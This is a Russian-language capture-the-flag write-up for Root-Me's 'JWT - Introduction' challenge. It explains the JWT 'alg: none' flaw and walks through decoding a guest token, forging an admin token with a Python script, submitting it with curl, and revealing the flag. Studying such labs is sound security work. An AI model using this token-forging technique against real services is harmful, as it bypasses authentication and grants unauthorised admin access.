@@ -1,0 +1,70 @@
+# Root-Me Writeup: JWT - Introduction
+
+**Платформа:** [Root-Me](https://www.root-me.org/)  
+**Категория:** Web - Client / Server  
+**Уровень:** ⭐⭐ (2/5)  
+**Автор:** Руслан  
+**Дата решения:** 26.10.2026  
+
+---
+
+## 📋 Описание задания
+
+> *Цель: Получите доступ к панели администратора, эксплуатируя уязвимость в реализации JSON Web Tokens (JWT).*
+
+**Задача:** Авторизоваться в системе под учетной записью администратора, не зная его пароля, путем модификации JWT-токена.
+
+---
+
+## 🧠 Теория: Уязвимость `alg: none` в JWT
+
+**JSON Web Token (JWT)** состоит из трех частей, разделенных точкой:
+1. **Header** (Заголовок): тип токена и алгоритм подписи (например, `HS256`).
+2. **Payload** (Полезная нагрузка): данные (claims), например, `{"role": "guest"}`.
+3. **Signature** (Подпись): криптографическая хеш-сумма Header + Payload, подписанная секретным ключом сервера.
+
+**Уязвимость `alg: none`:** 
+Некоторые библиотеки для проверки JWT ошибочно поддерживают алгоритм `"none"`. Если атакующий меняет алгоритм в заголовке на `"none"` и удаляет подпись (оставляя её пустой), уязвимый сервер может просто пропустить проверку подписи и довериться данным в Payload, считая токен валидным.
+
+---
+
+## 🔍 Разведка
+
+1. Переходим на страницу задания и нажимаем **"Login as Guest!"**.
+2. Открываем DevTools (F12) → вкладка **Application** → **Cookies**.
+3. Находим cookie с именем `jwt` и копируем его значение.
+
+**Оригинальный токен:**
+```text
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0.MzI6YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZGVmZ2g
+Эксплуатация
+Шаг 1: Декодирование токена
+Декодируем первые две части токена из Base64, чтобы понять его структуру:
+echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
+# Результат: {"typ":"JWT","alg":"HS256"}
+
+echo "eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0" | base64 -d
+# Результат: {"username":"guest","role":"guest"}
+
+Шаг 2: Подделка (Forging) токена
+Мы хотим изменить role на admin. Для этого мы создадим новый токен с алгоритмом "none", чтобы сервер не требовал валидную криптографическую подпись.
+Используем простой Python-скрипт для генерации:
+import base64, json
+
+# 1. Меняем алгоритм на "none"
+header = base64.urlsafe_b64encode(json.dumps({"typ":"JWT","alg":"none"}).encode()).rstrip(b"=").decode()
+
+# 2. Повышаем привилегии до admin
+payload = base64.urlsafe_b64encode(json.dumps({"username":"admin","role":"admin"}).encode()).rstrip(b"=").decode()
+
+# 3. Собираем токен с пустой подписью (точка в конце)
+print(header + "." + payload + ".")
+Результат (поддельный токен):
+eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.
+Шаг 3: Отправка на сервер
+Подменяем cookie jwt в браузере на наш поддельный токен и обновляем страницу (или отправляем через curl):
+curl -s http://challenge01.root-me.org/web-serveur/ch58/index.php \
+  -H "Cookie: jwt=eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0."
+Сервер принимает токен и возвращает страницу администратора с флагом.
+🏁 Флаг
+S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
